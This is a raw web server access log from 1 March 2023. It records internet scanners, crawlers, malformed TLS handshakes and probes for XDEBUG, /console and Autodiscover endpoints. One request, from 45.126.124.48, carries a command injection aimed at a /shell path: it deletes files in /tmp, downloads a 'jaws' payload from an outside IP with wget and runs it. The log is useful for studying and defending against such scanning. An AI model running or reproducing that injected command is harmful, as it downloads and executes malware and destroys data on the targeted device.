178.88.113.246 - - [01/Mar/2023:16:45:24 +0600] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
152.89.196.211 - - [01/Mar/2023:16:56:04 +0600] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.126.124.48 - - [01/Mar/2023:17:04:40 +0600] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 107.6.255.132/jaws;sh+/tmp/jaws HTTP/1.1" 404 153 "-" "Hello, world"
152.89.196.211 - - [01/Mar/2023:17:07:50 +0600] "GET /console/ HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.237.99.239 - - [01/Mar/2023:17:08:12 +0600] "\x03\x00\x00\x13\x0E\xE0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00" 400 157 "-" "-"
95.108.213.241 - - [01/Mar/2023:17:26:40 +0600] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.268"
149.56.20.160 - - [01/Mar/2023:17:33:05 +0600] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36"
185.234.114.72 - - [01/Mar/2023:17:34:55 +0600] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xCB\xA2\xC1\xB3 V2\x0B@\x8Dh_rj" 400 157 "-" "-"
185.234.114.72 - - [01/Mar/2023:17:34:55 +0600] "GET / HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3883.400 QQBrowser/10.8.4559.400"
185.234.114.72 - - [01/Mar/2023:17:34:55 +0600] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x0C\x83>]{NU\xA0\x19\xD9\xB9\xA4\x91\xBC\xDA\xFELk%\x88\xE4\xFBI3_\x9BS\xC7\xE4 @\xD7 \xC7\x9E\x0E\xF5\xD5EB\x00\xA0U \xA6\x11p\x5Cs\xACe\x13\xD1,\xB3_\xE1!\xCB\xCE\x05bz\x91\xB1\x00&\xCC\xA9\xCC\xA8\xC0+\xC0/\xC0,\xC00\xC0\x09\xC0\x13\xC0" 400 157 "-" "-"
185.234.114.72 - - [01/Mar/2023:17:34:55 +0600] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03y\x0C\xE6CG\x01\x1D\xA3a\x8D5\x01\xB6\xB6[\x9B\xB8\xEB\xFA\xC7u" 400 157 "-" "-"
185.234.114.72 - - [01/Mar/2023:17:34:55 +0600] "GET / HTTP/1.1" 404 125 "-" "Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6"
185.234.114.72 - - [01/Mar/2023:17:34:55 +0600] "GET / HTTP/1.1" 404 125 "-" "Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20120502 Firefox/12.0 SeaMonkey/2.9.1"
185.234.114.72 - - [01/Mar/2023:17:34:55 +0600] "GET favicon.ico HTTP/1.1" 400 157 "-" "-"
185.234.114.72 - - [01/Mar/2023:17:34:55 +0600] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xF2\x8C\xB3\xE5\xF6(&Jzlu\x8D\xF6\x0F\xE5t\xB2^3\x9B9\x7F\xF2&P\xF8\xE0\x98<\x81>T \x08j\xAB\xA4\xFF$\xEF\xBCq\xA3" 400 157 "-" "-"
185.234.114.72 - - [01/Mar/2023:17:34:56 +0600] "GET favicon.ico HTTP/1.1" 400 157 "-" "-"
185.234.114.72 - - [01/Mar/2023:17:34:56 +0600] "GET / HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36 Edge/12.0"
185.234.114.72 - - [01/Mar/2023:17:34:56 +0600] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xD6G#\xF4[8\xE5KZ\xF9\xF8\x09(\xED\x03:N\x82\xEF-xU\xC2]L\x82\xC7\xEC\xDA\x80\x7F\x95 \xB0\x96\x02\xB8\xD3Vs%\xDCvM\x07]\x86W<\x95\x10xQ0\xED\xD6\x81\xF8\xF6\x99\xF2\xB6\x9EC;\x00&\xCC\xA9\xCC\xA8\xC0+\xC0/\xC0,\xC00\xC0\x09\xC0\x13\xC0" 400 157 "-" "-"
185.234.114.72 - - [01/Mar/2023:17:34:56 +0600] "GET favicon.ico HTTP/1.1" 400 157 "-" "-"
185.234.114.72 - - [01/Mar/2023:17:34:56 +0600] "GET / HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Linux; Android 11; SM-A526U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36"
185.234.114.72 - - [01/Mar/2023:17:34:56 +0600] "GET favicon.ico HTTP/1.1" 400 157 "-" "-"
185.234.114.72 - - [01/Mar/2023:17:34:56 +0600] "GET favicon.ico HTTP/1.1" 400 157 "-" "-"
152.89.196.211 - - [01/Mar/2023:17:41:29 +0600] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
143.42.154.83 - - [01/Mar/2023:17:53:03 +0600] "LINK / HTTP/1.1" 404 125 "-" "Mozilla/5.0 zgrab/0.x"
195.211.23.223 - - [01/Mar/2023:17:55:40 +0600] "GET / HTTP/1.1" 301 169 "-" "Python/3.8 aiohttp/3.6.2"
64.62.197.87 - - [01/Mar/2023:17:57:22 +0600] "GET /favicon.ico HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
195.178.120.37 - - [01/Mar/2023:18:00:41 +0600] "GET / HTTP/1.1" 404 125 "-" "Linux Gnu (cow)"
